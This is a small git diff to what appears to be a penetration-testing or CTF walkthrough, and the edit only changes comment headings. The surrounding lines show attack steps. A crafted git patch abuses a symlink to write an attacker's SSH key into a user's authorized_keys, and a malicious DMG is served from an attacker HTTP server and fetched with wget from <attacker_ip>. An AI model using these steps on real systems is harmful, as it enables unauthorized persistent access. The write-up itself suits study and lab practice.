@@ -276,10 +276,10 @@ git commit -m "add symlink"
 **Step 2:** Create a malicious patch file that renames the symlink and writes our SSH public key into sbrown's `authorized_keys`:
 
 ```bash
-## Step 1 (Attacker Machine)
+# Step 1 (Attacker Machine)
 ssh-keygen -t rsa -b 4096 -f ./id_rsa
 
-## Step 2 (Victim Machine)
+# Step 2 (Victim Machine)
 cat >patch <<-EOF
 diff --git a/symlink b/renamed-symlink
 similarity index 100%
@@ -371,10 +371,10 @@ bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://
 Host the malicious DMG on a Python HTTP server and download it on the victim machine:
 
 ```bash
-## Attacker Machine
+# Attacker Machine
 python3 -m http.server 8081
 
-## Victim Machine
+# Victim Machine
 wget <attacker_ip>:8081/exploit.dmg
 ```
 
